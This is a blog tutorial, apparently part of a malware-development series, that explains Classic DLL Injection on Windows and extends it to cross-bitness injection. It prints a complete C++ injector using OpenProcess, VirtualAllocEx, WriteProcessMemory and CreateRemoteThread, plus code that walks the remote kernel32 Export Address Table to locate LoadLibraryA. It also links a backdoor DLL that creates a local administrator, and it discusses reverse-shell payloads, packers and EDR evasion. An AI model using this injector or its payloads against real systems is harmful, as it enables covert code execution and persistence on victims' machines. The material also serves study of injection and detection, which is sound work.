Title: Lesson 4.1 - Improving Classic DLL Injection
Date: 2022-06-08T19:18:32.000Z
ImageURL: https://images.unsplash.com/photo-1589652717521-10c0d092dea9?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3M3wwfDF8c2VhcmNofDExfHxjb21wdXRlciUyMHZpcnVzfGVufDB8fHx8MTY1NDcxNjA0MA&ixlib=rb-1.2.1&q=80&w=2000
Synopsis: As the name implies, Classic DLL Injection is one of the simpliest techniques that one can use for injecting malicious code into remote processes. Due to the way it works, you can't inject into processes with a different bitness, however in this post I'll explain how to adapt it, using some tweaks, to make it work all the time!

Recently I found myself interested in learning more and more about Process Injection, mainly due to high number of techniques you can use to achieve the same goal: remote code execution in other processes.

There are many useful resources publicly available on the Internet regarding this topic, such as:

- [Windows Process Injection in 2019 by  Amit Klein and Itzik Kotler](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf)
- [Ten process injection techniques: A technical survey of common and trending process injection techniques by Ashkan Hosseini](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

One of the most basic methods to perform Process Injection, and the one I'm going to discuss here, is known as *Classic DLL Injection*.

As regards its author, I've tried tracking them down based on the information available on the Internet, however I couldn't find a decisive answer.

As the name implies, the technique is based on the injection of a *Dynamic Link Library* (DLL) within the memory of a remote process. Below is a diagram that sums up the steps you have to follow to perform it.


At a high level, it is based on the creation of a thread inside a victim process that loads an arbitrary DLL library.

To implement it, you would usually follow the steps below:

1. Allocate some space in the memory of the victim process, it must be enough to contain the path of the malicious DLL, e.g. `C:\Temp\malicious.dll`
2. Write the path of the DLL inside the allocated memory space using a write primitive e.g. WriteProcessMemory
3. Force the victim process to create a new thread in order to use the path of the DLL to load it and execute the malicious payload

## Creating the DLL

The obvious requirement of DLL Injection is to a have, well, a DLL to inject. There are many ways to obtain one e.g., you can create one that starts a reverse shell or a fully-featured meterpreter session using the `metasploit` framework.

Among the many alternatives, there's also the possibility to write one from scratch. Fortunately, I've already written the [source code](https://github.com/rbctee/MalwareDevelopment/tree/master/code/windows/backdoor-dll) for a simple DLL a few months ago.

The one above creates a new local administrator named `rbct`. In my experience it's been useful for *Capture the Flag* competitions and real-life engagements, as it can be easily injected into other processes.

One of the advantages of writing your programs into a basic language like C/C++ is that they can't be easily reversed or de-compiled, more so if you also use a custom packer.

## Keeping it classy

If you were to search for some implementations on the Internet, you would probably find something similar to [my code](https://github.com/rbctee/ProcessInjection/blob/master/techniques/classic_dll_injection/code/cpp/simple.cpp):

Removing the comments and the conditional statements checking the return values of the functions, it's possible to keep the source code under thirty lines of code:

```cpp
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

int main(int argc, char* argv[])
{
    unsigned int victimProcessId;

    if (argc > 1)
    {
        victimProcessId = atoi(argv[1]);
    }
    else
    {
        printf("[+] Usage:\n\tprogram.exe PID\n");
        return 1;
    }

    DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    HANDLE victimProcessHandle = OpenProcess(desiredAccess, NULL, victimProcessId);

    LPVOID allocatedMemory = VirtualAllocEx(victimProcessHandle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    char maliciousLibrary[] = "C:\\Users\\rbct\\Desktop\\malicious.dll";

    BOOL retVal = WriteProcessMemory(victimProcessHandle, allocatedMemory, maliciousLibrary, strlen(maliciousLibrary), NULL);
        
    HMODULE handleTargetModule = GetModuleHandleA("kernel32.dll");
    PVOID loadLibraryLocalAddress = GetProcAddress(handleTargetModule, "LoadLibraryA");

    HANDLE remoteThread = CreateRemoteThread(victimProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryLocalAddress, allocatedMemory, 0, NULL);
    
    WaitForSingleObject(remoteThread, INFINITE);
}
```

Minified or not, the source code runs the following Win32 API functions:

- `OpenProcess` opens the process identified by the PID passed to the function, returning a *HANDLE* to the remote process
- `VirtualAllocEx` allocates a new memory page (default size of 4096 bytes) in the remote process, setting it as readable and writable.
- `WriteProcessMemory` writes the path of the DLL in the allocated memory page
- `GetProcAddress` retrieves the address of the function `LoadLibraryA` in the memory space of the current process. This address should be the same for the remote process, otherwise the injection will fail.
- `CreateRemoteThread` creates a new thread in the remote process, which calls the function `LoadLibraryA` with the pointer to the DLL path
- `WaitForSingleObject` awaits the termination of the remote thread

That's the everyday Classic DLL Injection you can find on the Internet. It's pretty simple to implement, however it suffers from a little problem regarding the bitness of the processes.

To be more specific, the bitness of the remote process must be equal to the bitness of the current process i.e., the one doing the injection:

| | Remote Process (32-bit) | Remote Process (64-bit) |
| - | - | - |
| Current Process (32-bit)| ✔️ | ❌ |
| Current Proces (64-bit)| ❌ | ✔️ |

If the bitness of the two processes is different, the injection will fail. This is caused by the usage of `GetModuleHandle` and `GetProcAddress` to retrieve the address of the function `LoadLibraryA`.

In fact, if the bitness of the remote process is different, it means that the length of a memory address is different.

For example, if the current process is 32-bit, then it uses 32-bits-long virtual addresses, while a 64-bit process uses 64-bits-long virtual addresses.

Therefore, if the function `LoadLibraryA` returns a 64-bits-long virtual address, we can't pass it to the function CreateRemoteThread on a 32-bit process, otherwise the latter will fail.

There's also another problem: this approach is based on the assumption that the order of the DLL libraries loaded in the victim process is the same as for the current process.

That's why we don't retrieve the address of `LoadLibraryA` from the remote process, but from the current process, since the position of the DLL `kernel32.dll` **should** be the same for all the processes of the same bitness.

However, if the order of the DLL is different, then the address for `LoadLibraryA` in the current process will point to something else entirely in the remote process.

## S stands for Stability

To solve these issues, I've rewritten most of the source code. You can find the final version at [this link](https://github.com/rbctee/ProcessInjection/blob/master/techniques/classic_dll_injection/code/cpp/stable.cpp).

Compared to the previous code, there are a few changes regarding the dependencies of the program, the Win32 API functions used, and the techniques employed:

- using the Tool Help Library to enumerate the DLL libraries loaded by the victim process
- using the function `ReadProcessMemory` to read information from the remote process e.g., memory addresses
- using the functions `HeapAlloc` and `HeapFree` to manage the heap memory, the latter used for storing the bytes read from victim process
- accessing the EAT (*Export Address Table*) of the `kernel32.dll` library loaded by the remote process, in order to calculate the exact address of the function `LoadLibraryA`.

I'm not going to discuss every instruction inside the source code, mainly because half of the file is made up of comments. Instead, I'll describe how to retrieve the necessary information from the EAT structure, since it's the part I consider most interesting.

## Analyzing the headers

One way to obtain the address of the Export Address Table is to calculate it based on the bits of information found in the headers of the DLL (kernel32.dll in this case).

The steps are more of less the following:

1. retrieving the base address of the DLL library
2. reading the value of the field `e_lfanew` from the DOS header to get the position of the NT Headers
3. reading the value of the field `OptionalHeader` to get the address of the Optional Header structure
4. getting the address of the *Export Directory Table* from the `VirtualAddress` field of the first element of the array `DataDirectory` from the Optional Header
5. access the Export Address Table through the fields `AddressOfFunctions`, `AddressOfNames`, `AddressOfNameOrdinals`

The following figures shows how to get to the Export Address Table starting from the structure `_IMAGE_DOS_HEADER`, which can be found at the very beginning of the DLL file.


Note that structures such as `_IMAGE_DOS_HEADER` remain the same regardless of the bitness of the DLL, so you can for example access the field `e_lfanew` adding **0x3c** to the base address of the loaded library.

However, other structures such as `_IMAGE_NT_HEADERS` have different fields based on the bitness of the DLL:

- [`_IMAGE_NT_HEADERS64`](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64)
- [`_IMAGE_NT_HEADERS32`](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32)

This is very important to remember when writing code, but also useful while debugging with WinDbg: if you don't use the correct version of the structure, or if the programs defaults to the 32-bit version, the values you analyze may be completely different from what you're expecting.

## Tracking down the exports

Before showing how to get the address of LoadLibraryA let's talk a bit about the Export Directory. Based on some documentation I've found on the Internet, its structure should be like this:

| Offset | Size | Field | Description |
| - | - | - | - |
| 0 | 4 | Export Flags | Reserved, must be 0. |
| 4 | 4  | Time/Date Stamp | The time and date that the export data was created. |
| 8 | 2 | Major Version | The major version number. The major and minor version numbers can be set by the user. |
| 10 | 2 | Minor Version | The minor version number. |
| 12 | 4 | Name RVA | The address of the ASCII string that contains the name of the DLL. This address is relative to the image base. |
| 16 | 4 | Ordinal Base | The starting ordinal number for exports in this image. This field specifies the starting ordinal number for the export address table. It is usually set to 1. |
| 20 | 4 | Address Table Entries | The number of entries in the export address table. |
| 24 | 4 | Number of Name Pointers | The number of entries in the name pointer table. This is also the number of entries in the ordinal table. |
| 28 | 4 | Export Address Table RVA | The address of the export address table, relative to the image base. |
| 32 | 4 | Name Pointer Table RVA | The address of the export name pointer table, relative to the image base. The table size is given by the Number of Name Pointers field. |
| 36 | 4 | Ordinal Table RVA | The address of the ordinal table, relative to the image base. |

The fields that are useful to us are:

- *Address Table Entries*, to determine the size of the Export Address Table and how many times to loop
- *Export Address Table RVA*, which points to the beginning of the EAT
- *Name Pointer Table RVA*, pointing to the names of the exported functions

Putting this information together, we can loop through the EAT, checking whether the name of the exported function is equal to `LoadLibraryA`.

The offset of the name pointer (of the string "*LoadLibraryA*") can be used in the Export Address Table RVA to get the RVA of the function. RVA stands for *Relative Virtual Address* and it's a relative address, in this case relative to the base address of the module.

Adding the base address of the module (kernel32.dll) to the RVA we get the absolute address of `LoadLibraryA`, which we can pass to `CreateRemoteThread`.

Below is a snippet of code containing the part of the source code that retrieves the address of `LoadLibraryA` from the EAT:

```cpp
    /*
    Populate the structure IMAGE_EXPORT_DIRECTORY with the first bytes of the
    export directory, which at the moment are located on the heap.
    We'll need this structure to retrieve the offset of the names/address of the
    exported functions.
    */
    IMAGE_EXPORT_DIRECTORY imageExportDirectory;
    CopyMemory(
        &amp;imageExportDirectory,				// pointer to variable/struct to populate
        allocatedHeapMemoryAddress,			// pointer to the source buffer
        sizeof(IMAGE_EXPORT_DIRECTORY));	// number of bytes to copy from the source buffer

    int numExportedFunctions = imageExportDirectory.NumberOfFunctions;
    printf("[+] Num. of functions exported by the module kernel32.dll loaded by the victim process: 0x%x (%d)\n", numExportedFunctions, numExportedFunctions);

    /*
    Calculate the absolute addresses (in the current process, since we copied the entire Export Directory)
    - addressExportFunctionsNames -> absolute address of the Relative Virtual Address (RVA) of the name
        of the first function
    - addressExportFunctions -> absolute address of the Relative Virtual Address (RVA) of the code
        of the first function
    By RVA, we mean an offset starting from the base address of the module (kernel32.dll)
    */
    ULONG_PTR addressExportFunctionsNames = ((ULONG_PTR)allocatedHeapMemoryAddress) + 
        (imageExportDirectory.AddressOfNames - exportDirectoryAddressOffset);
    ULONG_PTR addressExportFunctions = ((ULONG_PTR)allocatedHeapMemoryAddress) +
        (imageExportDirectory.AddressOfFunctions - exportDirectoryAddressOffset);
    
    ULONG_PTR offsetExportFunctionName;
    ULONG_PTR addressExportFunctionName;
    ULONG_PTR targetFunctionAddress;
    ULONG_PTR targetFunctionRVA;

    char targetFunctionName[] = "LoadLibraryA";
    
    /*
    Loop through all the exported functions from the target module (kernel32.dll).
    There should be about 1600 functions to check.
    */
    for (int i = 0; i < numExportedFunctions; i++)
    {

        /*
        Copy the Relative Virtual Address (RVA) of the function name, so we can
        retrieve it and compare it with the string 'LoadLibraryA'.
        */
        CopyMemory(
            &amp;offsetExportFunctionName,
            (PVOID)(addressExportFunctionsNames + (i * 4)),
                4);

        /*
        Calculating the absolute address of the function name.
        Since we copied the entire Export Directory from the victim process,
        there's no need to call ReadProcessMemory for each function.
        The absolute address of the function name resides in the Heap
        of the current process.
        */
        addressExportFunctionName = ((ULONG_PTR)allocatedHeapMemoryAddress) +
            offsetExportFunctionName - exportDirectoryAddressOffset;

        /*
        Checking if the name of the exported function is equal to "LoadLibraryA".
        */
        if (strcmp(targetFunctionName, (const char *)addressExportFunctionName) == 0)
        {
            printf("[+] Function name: %s\n", addressExportFunctionName);

            /*
            Copy the RVA, which is 4-bytes long, of the target function (LoadLibraryA)
            into the variable 'targetFunctionRVA'.
            */
            CopyMemory(
                &amp;targetFunctionRVA,
                (PVOID)(addressExportFunctions + (i * 4)),
                4);

            printf("[+] Relative Virtual Address of the target Export Function: %p\n", targetFunctionRVA);

            /*
            Now that we have the RVA of LoadLibraryA, we can calculate its absolute address
            (in the memory of the victim process).
            */
            targetFunctionAddress = (ULONG_PTR)(moduleStructure.modBaseAddr + targetFunctionRVA);
            printf("[+] Absolute Virtual Address of the target Export Function in the victim process: %p\n", targetFunctionAddress);

            break;
        }
    }
    
```

## Afterword

As for now, the technique can be used both from 32-bit process and 64-bit process, to inject a DLL library in a remote process of arbitrary bitness, as recapitulated in the following table:

| | Remote Process (32-bit) | Remote Process (64-bit) |
| - | - | - |
| Current Process (32-bit) 	| ✔️ | ✔️ |
| Current Proces (64-bit) |✔️ | ✔️ |

Although I've modified the Classic DLL Injection with the goal to improve it, it still remains very basic from in terms of evasion capabilities, so EDR products may detect it immediately.

Obviously there's some room for improvement. For example, you could remove suspicious functions such as `ReadProcessMemory`, instead mapping the DLL into memory.

Nonetheless, I hope you found this version of the Classic DLL Injection interesting.